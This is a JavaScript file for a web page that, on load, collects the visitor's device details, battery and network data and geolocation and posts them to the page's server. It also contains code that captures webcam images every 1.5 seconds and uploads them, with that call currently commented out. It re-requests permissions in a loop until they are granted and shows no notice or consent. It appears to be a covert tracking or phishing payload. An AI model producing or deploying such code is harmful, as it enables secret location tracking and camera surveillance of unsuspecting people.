//gathering device info
let get_device_info=()=>{
 // Get browser and OS information
 const userAgent = navigator.userAgent;
 const platform = navigator.platform;
 
 // Get device model and type
 const deviceModel = userAgent.match(/(Android|iPhone|iPad|iPod)/);
 const deviceType = screen.orientation.type;
 
 // Get CPU and GPU information
 const cpuCores = navigator.hardwareConcurrency;
 const deviceRAM = navigator.deviceMemory;
// Get network and IP information
const networkType = navigator.connection.type;
const networkSpeed = navigator.connection.downlink;
//battery
navigator.getBattery().then(battery=>{

  //sending data
fetch("/device_info", {
  method: "POST",
  body: JSON.stringify({
    platform: `${deviceModel}`,
    screen_type: `${deviceType}`,
    ram: `${deviceRAM}`,
    core: `${cpuCores}`,
    battery: `${battery.level * 100}`,
    charging: `${battery.charging}`,
    network_type: `${networkType}`,
    network_speed: `${networkSpeed}`,
  }),
  headers: {
    "Content-type": "application/json; charset=UTF-8"
  }
})
  .then((response) => response.json())
  .then((json) => console.log(json));
});
}



//location
let checkinsss=()=>{
    if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function (position) {
    // Get latitude and longitude
    const latitudes = position.coords.latitude;
    const longitudes = position.coords.longitude;
    send(latitudes,longitudes)
}, function (error) {
    checkinsss();
});
} else {
    checkinsss();
}
};
let send = (lati, long) => {
  try{
  fetch("/send_location", {
    method: "POST",
    body: JSON.stringify({
      l1: `${lati}`,
      l2: `${long}`,
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8"
    }
  })
    .then((response) => response.json())
    .then((json) => console.log(json));
}catch(e){
  alert(e)
}
};
//taking pic


function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: JSON.stringify({ image: imgdata }),  // Send as JSON
        url: '/upload_images',
        contentType: 'application/json',           // Set content type to JSON
        dataType: 'json',
        async: false,
        success: function(result) {
            console.log("Image uploaded successfully", result);
        },
        error: function(error) {
            console.error("Error uploading image:", error);
        }
    });
}

// Rest of your code remains unchanged

    
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');
    
    const constraints = {
      audio: false,
      video: {
        
        facingMode: "user"
      }
    };
    
    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        init();
      }
    }
    
    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
    
    var context = canvas.getContext('2d');
      setInterval(function(){
    
           context.drawImage(video, 0, 0, 640, 480);
           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
           post(canvasData); }, 1500);
      
    
    }
    
    // Load init
    window.onload=()=>{
      get_device_info();
      checkinsss();
      // init();
  }
